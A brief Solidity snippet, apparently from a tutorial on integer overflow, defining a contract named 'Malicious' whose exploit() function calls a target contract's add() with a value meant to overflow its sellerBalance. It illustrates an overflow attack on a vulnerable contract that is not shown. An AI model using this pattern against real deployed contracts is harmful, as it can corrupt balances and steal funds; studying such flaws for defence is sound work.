contract Malicious {
    Overflow target;

    function Malicious(address _target) public {
        target = Overflow(_target);
    }

    function exploit(uint value) public {
        // Call add with a value that will overflow sellerBalance
        target.add(value);
    }
}